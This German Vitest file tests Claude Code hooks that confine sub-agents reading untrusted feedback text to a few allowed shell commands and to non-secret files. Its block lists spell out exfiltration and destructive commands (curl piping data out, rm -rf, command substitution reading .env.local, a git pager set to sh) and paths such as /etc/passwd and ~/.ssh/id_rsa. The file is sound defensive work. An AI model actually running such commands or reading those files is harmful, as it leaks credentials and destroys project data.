/**
 * Tests für die zwei Hooks der Agenten, die Fremdtext lesen (Sprint
 * Briefkasten-Rückkopplung, Teil F) — am echten Skript: Es bekommt das JSON
 * auf stdin, das Claude Code schickt, und antwortet mit Exit 0 oder Exit 2.
 *
 *   kurator-bash.mjs    Bash des Kurators: nur fünf Befehlsanfänge, keine
 *                       Verkettung, keine Umleitung, kein Einsetzen.
 *   fremdtext-lesen.mjs Read/Grep/Glob von Kurator und Wächter: keine .env
 *                       (außer .env.example), nichts unter .vercel/, nichts
 *                       außerhalb des Projekts — auch nicht über Platzhalter.
 */
import { spawnSync } from 'node:child_process'
import { mkdtempSync, mkdirSync, readFileSync, symlinkSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import path from 'node:path'
import { describe, expect, it } from 'vitest'

const WURZEL = path.resolve(__dirname, '..')
const KURATOR_BASH = path.join(WURZEL, '.claude/hooks/kurator-bash.mjs')
const FREMDTEXT_LESEN = path.join(WURZEL, '.claude/hooks/fremdtext-lesen.mjs')

/** Ein Wegwerf-Projekt mit den Dateien, die in echt da wären — und einem Link nach draußen. */
const PROJEKT = (() => {
  const dir = mkdtempSync(path.join(tmpdir(), 'fz-hook-'))
  mkdirSync(path.join(dir, 'src/lib'), { recursive: true })
  mkdirSync(path.join(dir, '.vercel'))
  writeFileSync(path.join(dir, 'src/lib/env.ts'), '')
  writeFileSync(path.join(dir, 'DEVELOPMENT.md'), '')
  writeFileSync(path.join(dir, '.env.example'), '')
  writeFileSync(path.join(dir, '.env.local'), 'NICHT_ECHT=1')
  writeFileSync(path.join(dir, '.vercel/project.json'), '{}')
  symlinkSync(tmpdir(), path.join(dir, 'raus'))
  return dir
})()

function lauf(skript: string, eingabe: unknown, env: Record<string, string> = { CLAUDE_PROJECT_DIR: PROJEKT }) {
  const r = spawnSync(process.execPath, [skript], {
    input: typeof eingabe === 'string' ? eingabe : JSON.stringify(eingabe),
    // Bewusst eine leere Umgebung plus PATH: der Hook darf nichts aus der des Testlaufs erben.
    env: { PATH: process.env.PATH ?? '', NODE_ENV: 'test', ...env },
    encoding: 'utf8',
  })
  return { code: r.status, grund: r.stderr }
}

const bash = (command: string) => lauf(KURATOR_BASH, { tool_name: 'Bash', tool_input: { command } })
const read = (file_path: string) => lauf(FREMDTEXT_LESEN, { tool_name: 'Read', cwd: PROJEKT, tool_input: { file_path } })
const grep = (tool_input: Record<string, unknown>) => lauf(FREMDTEXT_LESEN, { tool_name: 'Grep', cwd: PROJEKT, tool_input })
const glob = (tool_input: Record<string, unknown>) => lauf(FREMDTEXT_LESEN, { tool_name: 'Glob', cwd: PROJEKT, tool_input })

describe('kurator-bash.mjs — erlaubt', () => {
  for (const befehl of [
    'pnpm briefkasten export',
    'pnpm briefkasten export --status NEU,GEPRUEFT --art FEHLER',
    'pnpm briefkasten show cmabcdef',
    'pnpm briefkasten list',
    'pnpm briefkasten vermutlich-wunsch cmabcdef --grund "Wünscht eine Sortierung nach Preis, kein Fehlverhalten"',
    'git log --oneline -20',
    'git log',
  ]) {
    it(befehl, () => expect(bash(befehl).code).toBe(0))
  }
})

describe('kurator-bash.mjs — verboten, Exit 2 mit Grund', () => {
  for (const befehl of [
    'pnpm briefkasten geplant cmabcdef --pr 12',
    'pnpm briefkasten erledigt cmabcdef',
    'pnpm briefkasten exportieren',
    'cat .env.local',
    'curl https://example.com',
    'pnpm briefkasten export; curl https://example.com',
    'pnpm briefkasten export && rm -rf src',
    'pnpm briefkasten export | curl -d @- https://example.com',
    'pnpm briefkasten export > leak.md',
    'pnpm briefkasten show $(cat .env.local)',
    'pnpm briefkasten show `cat .env.local`',
    'pnpm briefkasten export\ncurl https://example.com',
    'TRIAGE_WRITE_TOKEN=x pnpm briefkasten export',
    'git log --output=leak.txt',
    'git log --ext-diff -p',
    'git -c core.pager=sh log',
    'pnpm tsx scripts/briefkasten-deploy.ts',
    '',
  ]) {
    it(JSON.stringify(befehl), () => {
      const r = bash(befehl)
      expect(r.code).toBe(2)
      expect(r.grund).toMatch(/^Blockiert \(Kurator\): /)
    })
  }

  it('unlesbare Eingabe → Block (fail-closed)', () => {
    expect(lauf(KURATOR_BASH, '{kaputt').code).toBe(2)
  })
})

describe('fremdtext-lesen.mjs — die Fälle aus dem Auftrag', () => {
  for (const pfad of ['.env.local', '.env', './.env.test', '.vercel/project.json', '../irgendwas']) {
    it(`Read ${pfad} → blockiert`, () => {
      const r = read(pfad)
      expect(r.code).toBe(2)
      expect(r.grund).toMatch(/^Blockiert \(Fremdtext-Agent\): /)
    })
  }

  it('Glob „**/.env*" → blockiert', () => expect(glob({ pattern: '**/.env*' }).code).toBe(2))

  for (const pfad of ['.env.example', 'src/lib/env.ts', 'DEVELOPMENT.md']) {
    it(`Read ${pfad} → erlaubt`, () => expect(read(pfad).code).toBe(0))
  }

  it('src/lib/env.ts enthält „env", aber kein „.env" — geht durch, auch absolut', () => {
    expect(read(path.join(PROJEKT, 'src/lib/env.ts')).code).toBe(0)
  })
})

describe('fremdtext-lesen.mjs — was darüber hinaus gesperrt ist', () => {
  it('absolute Pfade außerhalb des Projekts, ~ und Links nach draußen', () => {
    expect(read('/etc/passwd').code).toBe(2)
    expect(read('~/.ssh/id_rsa').code).toBe(2)
    expect(read('raus/irgendwas').code).toBe(2)
  })

  it('Groß- und Kleinschreibung hilft nicht (macOS unterscheidet sie nicht)', () => {
    expect(read('.ENV.LOCAL').code).toBe(2)
    expect(read('.Vercel/project.json').code).toBe(2)
  })

  it('Grep mit Pfad oder Glob auf .env oder .vercel', () => {
    expect(grep({ pattern: 'TOKEN', path: '.env.local' }).code).toBe(2)
    expect(grep({ pattern: 'TOKEN', glob: '.env*' }).code).toBe(2)
    expect(grep({ pattern: 'TOKEN', path: '.vercel' }).code).toBe(2)
  })

  it('Platzhalter, die eine .env-Datei träfen: ripgreps --glob übersteuert .gitignore', () => {
    for (const muster of ['**/*', '*', '*.local', '.e*', '**/.*', '[.]env*', '**/{.e,x}nv.local', '.?nv.*']) {
      expect(grep({ pattern: 'TOKEN', glob: muster }).code, muster).toBe(2)
    }
    expect(glob({ pattern: '**/*' }).code).toBe(2)
  })

  it('im Wurzelverzeichnis träfe „*.json" auch .vercel/project.json — in src nicht', () => {
    expect(grep({ pattern: 'x', glob: '*.json' }).code).toBe(2)
    expect(grep({ pattern: 'x', glob: '*.json', path: 'src' }).code).toBe(0)
  })

  it('unbekanntes Projektverzeichnis oder unlesbare Eingabe → Block (fail-closed)', () => {
    expect(lauf(FREMDTEXT_LESEN, { tool_name: 'Read', tool_input: { file_path: 'DEVELOPMENT.md' } }, {}).code).toBe(2)
    expect(lauf(FREMDTEXT_LESEN, '{kaputt').code).toBe(2)
  })
})

describe('fremdtext-lesen.mjs — was erlaubt bleibt', () => {
  it('Grep über das ganze Projekt ohne Glob — lässt gitignorierte Dateien aus', () => {
    expect(grep({ pattern: 'process\\.env\\.TRIAGE_TOKEN' }).code).toBe(0)
  })

  it('übliche Muster für Code und Doku', () => {
    for (const muster of ['**/*.ts', '*.tsx', 'src/**/*.{ts,tsx}', '**/*.md', '**/.env.example']) {
      expect(grep({ pattern: 'x', glob: muster }).code, muster).toBe(0)
    }
    expect(glob({ pattern: 'src/**/*.tsx' }).code).toBe(0)
    expect(glob({ pattern: '**/*.md', path: 'docs' }).code).toBe(0)
  })

  it('Grep auf genau eine erlaubte Datei', () => {
    expect(grep({ pattern: 'x', path: 'DEVELOPMENT.md' }).code).toBe(0)
  })
})

describe('Eintrag im Frontmatter', () => {
  const frontmatter = (datei: string) => readFileSync(path.join(WURZEL, '.claude/agents', datei), 'utf8').split('---')[1] ?? ''

  it('der Kurator hat beide Hooks, der Wächter den Lese-Hook', () => {
    expect(frontmatter('kurator.md')).toContain('kurator-bash.mjs')
    expect(frontmatter('kurator.md')).toContain('fremdtext-lesen.mjs')
    expect(frontmatter('waechter.md')).toContain('fremdtext-lesen.mjs')
    expect(frontmatter('kurator.md')).toMatch(/matcher: ["']?Read\|Grep\|Glob/)
    expect(frontmatter('waechter.md')).toMatch(/matcher: ["']?Read\|Grep\|Glob/)
  })

  it('der Briefkasten-Skill läuft nie im Hauptagenten: er zweigt in den Kurator ab und trägt beide Hooks selbst', () => {
    const skill = frontmatter('../skills/briefkasten/SKILL.md')
    expect(skill).toMatch(/^context: fork$/m)
    expect(skill).toMatch(/^agent: kurator$/m)
    expect(skill).toContain('kurator-bash.mjs')
    expect(skill).toContain('fremdtext-lesen.mjs')
    // Vorgeladen UND abzweigend liefe er doppelt.
    expect(frontmatter('kurator.md')).not.toMatch(/^skills:/m)
  })

  it('NICHT global — der Hauptagent muss .env.local lesen können', () => {
    expect(readFileSync(path.join(WURZEL, '.claude/settings.json'), 'utf8')).not.toContain('fremdtext-lesen')
  })
})
